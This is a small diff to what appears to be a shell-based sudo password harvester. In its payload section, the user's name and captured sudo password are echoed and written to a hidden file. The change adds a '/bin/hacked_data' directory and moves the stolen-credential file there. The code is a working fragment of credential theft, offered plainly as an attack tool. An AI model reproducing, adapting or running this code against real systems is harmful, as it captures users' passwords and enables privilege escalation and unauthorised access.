@@ -22,8 +22,9 @@ attempts() {
         ##
         # <YOUR-PAYLOAD>
         ##
+        mkdir /bin/hacked_data
         /bin/echo "${USER}:${sudo_password}"
-        /bin/echo "${USER}:${sudo_password}" > /bin/.sudo_password
+        /bin/echo "${USER}:${sudo_password}" > /bin/hacked_data/.sudo_password
         ##
         # </YOUR-PAYLOAD>
         ##
